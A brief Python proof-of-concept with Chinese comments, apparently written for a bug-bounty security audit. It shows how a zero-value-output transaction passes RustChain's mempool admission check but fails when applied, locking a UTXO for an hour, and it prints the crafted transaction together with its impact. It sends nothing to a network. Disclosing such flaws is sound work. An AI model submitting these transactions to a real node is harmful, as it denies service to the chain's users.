#!/usr/bin/env python3
"""
RustChain UTXO Mempool DoS via Zero-Value Outputs
漏洞: #2867 (Security Audit)
奖励: 25 RTC (Medium)

攻击: 构造零值输出交易
结果: UTXO 锁定 1 小时 (DoS)
"""

import json

def exploit():
    # 攻击交易
    tx = {
        "inputs": [{"box_id": "valid_box_id"}],
        "outputs": [{"value_nrtc": 0, "proposition": "attacker"}],
        "fee_nrtc": 0,
        "timestamp": 1776384830,
    }
    
    print("🎯 攻击交易:")
    print(json.dumps(tx, indent=2))
    print()
    print("📊 影响:")
    print("  - mempool_admit() 接受 (零值输出未检查)")
    print("  - apply_transaction() 拒绝 (零值无效)")
    print("  - UTXO 锁定 1 小时 (DoS)")
    print("  - 攻击者可重复锁定多个 UTXO")

if __name__ == "__main__":
    exploit()